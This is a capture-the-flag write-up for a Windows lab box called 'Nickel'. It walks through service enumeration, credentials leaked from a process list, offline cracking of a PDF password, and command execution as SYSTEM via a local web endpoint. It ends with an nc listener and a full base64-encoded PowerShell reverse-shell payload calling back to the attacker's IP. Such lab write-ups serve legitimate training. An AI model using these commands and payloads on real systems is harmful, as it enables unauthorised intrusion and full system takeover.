---
date: 2025-08-19
title: Nickel
tags:
  - Windows
  - Privilege-Escalation
  - Brute-Force
---
Difficulty: Intermediate
# Service Enumeration

I'll start with my default nmap scan:

`nmap $ip -sV -sC -oN ver_script.nmap`

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-05-25T14:01:35+00:00
|_ssl-date: 2025-05-25T14:02:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-05-24T13:55:30
|_Not valid after:  2025-11-23T13:55:30
8089/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-05-25T14:01:40
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

...and start an additional discovery scan across all ports to run while we begin enumeration of these services.

`nmap $ip -p- -oN all_ports.nmap`

# 21 - FileZilla FTP Server
`ftp anonymous@$ip`

FTP doesn't allow anonymous access.

# 80 - HTTP
I found that I wasn't able to reach HTTP at all using a browser or curl. 

# 445 - SMB
`crackmapexec smb $ip --shares -u '' -p ''`

No anonymous access on SMB either.

# 8089 - HTTP
Finally on port 8089 we encounter an interesting "DevOps Dashboard"

![[Pasted image 20250525073557.png]]

Upon clicking one of these buttons, it makes an HTTP request to 169.254.157.67:33333, which results in a timeout. This is a private IP used by APIPA (Automatic Private IP Addressing). 

Although our target isn't able to actually resolve the host using this address, it's a strong suggestion that we can use these requests to access internal resources, as in a Cross-Site Request Forgery Attack (CSRF). Our target server may be running this service itself.

This theory seems to be correct, as we find a web service on $ip:33333. In this case, we don't even need to use CSRF yet to make requests from the server, as this service is exposed to us.

`curl http://192.168.245.99:33333/list-running-procs`

```
<p>Cannot "GET" /list-running-procs</p>
```

This response suggests that the endpoint exists, but doesn't implement the GET action. However, it does appear to implement POST and GET:

![[Pasted image 20250525081916.png]]

Since the response indicates the server needs some content length specified, I'll try giving it an empty string by appending `-d ''`, which works and reveals a list of processes:

`curl http://192.168.245.99:33333/list-running-procs -X POST -d ''`

```
name        : System Idle Process
commandline :
...
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
...
name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe
```

# Initial Access
Towards the middle of the output we find SSH credentials for a user 'ariah'. This seems to be going go a different host (ssh-dev, while we know the current target's hostname is nickel from our nmap scan earlier, and also there would be no point in the user using SSH to connect to the current machine), but we can try those same credentials against the services on this target. 

![[Pasted image 20250525083317.png]]

The server allows us to attempt password authentication, meaning its configuration doesn't have `PasswordAuthentication no`, but ultimately it doesn't let us in using this password.

The password doesn't work against SMB or RDP either. I was fairly stuck at this point but eventually realized (using Cyberchef magic) that it's base64 encoded; once decoded, it reads `NowiseSloopTheory139`. Finally, this gives us SSH access on the target!

# Privilege Escalation

Our working directory is C:\Users\ariah and we can use `dir /s *.txt` to find local.txt in aria's Desktop.

We lack privileges to run `systeminfo`, but using `whoami /priv` we'll see that we have the following:
```
Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```
None of these are directly useful for privilege escalation. SeShutdownPrivilege may be useful if we need to restart a service however.

We also know from our earlier nmap scans that the version of SSH is "OpenSSH for_Windows_8.1" -- if we don't find anything obvious in manual enumeration, we can try using [Juico Potato](https://github.com/ohpe/juicy-potato) or looking for another CVE.

in C:\Users we see there's a home directory for Administrator, which is our next goal.

In C: there's an interesting file named output.txt. Reading it, it's a transcript from a PowerShell script which was located at C:\freezeScript\win10.ps1 and ran by Administrator. It reveals that this actually is a Windows 10 system, not Windows 8. Otherwise, this doesn't tell us much.

```
Windows PowerShell transcript start
Start time: 20250525065541
Username: NICKEL\Administrator
RunAs User: NICKEL\Administrator
...
Please use slmgr.vbs /ato to activate and update KMS client information in order to update values.
**********************
Windows PowerShell transcript end
End time: 20250525065544
**********************
```

However, C:\ftp contains Infrastructure.pdf. I connected to FTP using ariah's same credentials and downloaded the file. It's password protected, and ariah's credentials don't give access.
![[Pasted image 20250525091107.png]]

I'll use [pdf2john](https://www.kali.org/tools/john/#pdf2john) to convert it into a crackable format to brute force the password:

`pdf2john Infrastructure.pdf > crack.txt`

`john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt`

```
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ariah4168        (Infrastructure.pdf)
1g 0:00:00:55 DONE (2025-05-25 09:21) 0.01791g/s 179255p/s 179255c/s 179255C/s arial<3..ariadne01
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```

![[Pasted image 20250525092246.png]]

In our SSH session on the target, we see that the "temporary" command endpoint is still active, allowing us arbitrary code execution as NT Authority\system.

`curl http://localhost/?whoami`

```
<!doctype html><html><body>dev-api started at 2024-08-01T23:48:46

        <pre>nt authority\system
</pre>
</body></html>
```

We can use this to gain a reverse shell as system:

`nc -lnvp 443` (start listener on attacking machine)

I'll find a oneliner powershell reverse shell payload (result will be different for you IP and port), urlencode it, then pass as a parameter in the URL. 

![[Pasted image 20250525155705.png]]

```
curl http://localhost/?powershell%20-e%20JA
BjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0AL
gBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIA
LgAxADYAOAAuADQANQAuADIAMwA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0
AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAF
sAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3A
GgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5
AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgB
lACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQ
BUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkAR
QBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwA
MAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGE
AdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG
4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiA
CAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABi
AHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwB
DAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJA
BzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAc
wBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwA
dQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

We receive the connection on our listener and finish the room by finding C:\Users\Administrator\Desktop\proof.txt.
